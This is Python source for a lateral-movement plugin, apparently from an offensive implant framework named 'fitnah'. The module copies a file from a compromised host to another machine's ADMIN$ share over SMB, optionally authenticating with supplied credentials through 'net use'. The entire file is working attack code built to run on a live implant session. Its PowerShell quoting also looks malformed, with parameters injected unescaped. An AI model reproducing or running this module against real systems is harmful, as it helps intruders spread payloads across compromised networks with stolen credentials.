"""lateral_movement/smb_upload — copy file to remote host via UNC/SMB. MITRE T1021.002"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class SmbUpload(BasePlugin):
    NAME        = "smb_upload"
    DESCRIPTION = "Copy local file to \\\\target\\share\\dest via SMB; optional net use authentication."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1021.002"
    CATEGORY    = "lateral_movement"
    schema      = ParamSchema().add(
        Param("src",      str, required=True,  help="Local source path on implant"),
        Param("target",   str, required=True,  help="Target hostname or IP"),
        Param("share",    str, required=False, default="ADMIN$", help="Share name (default: ADMIN$)"),
        Param("dest",     str, required=False, default="",
              help="Destination filename or subpath within share (default: same filename)"),
        Param("username", str, required=False, default="", help="Username for auth"),
        Param("password", str, required=False, default="", help="Password"),
    )

    @mitre("T1021.002")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        src    = params["src"]
        target = params["target"]
        share  = params.get("share", "ADMIN$")
        dest   = params.get("dest", "").strip()
        user   = params.get("username", "")
        pwd    = params.get("password", "")

        auth   = f"net use \\\\'{target}'\\'{share}' /user:'{user}' '{pwd}' 2>&1 | Out-Null;" if user else ""
        deauth = f"net use \\\\'{target}'\\'{share}' /delete 2>&1 | Out-Null;" if user else ""

        ps = (
            f"$src = '{src}';"
            f"$unc = '\\\\{target}\\{share}';"
            + auth
            + "try {"
            f"  if (-not (Test-Path $unc)) {{ throw \"UNC path not accessible: $unc\" }};"
            f"  $fn = if ('{dest}') {{ '{dest}' }} else {{ [System.IO.Path]::GetFileName($src) }};"
            "  $dst = \"$unc\\$fn\";"
            "  Copy-Item $src $dst -Force -EA Stop;"
            "  $sz = (Get-Item $dst -EA SilentlyContinue).Length;"
            "  Write-Output \"[+] Uploaded: $dst  ($([Math]::Round($sz/1KB,1)) KB)\""
            "} catch { Write-Output \"[-] Upload failed: $_\" };"
            + deauth
        )
        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        return ModuleResult.ok(data=r["output"])
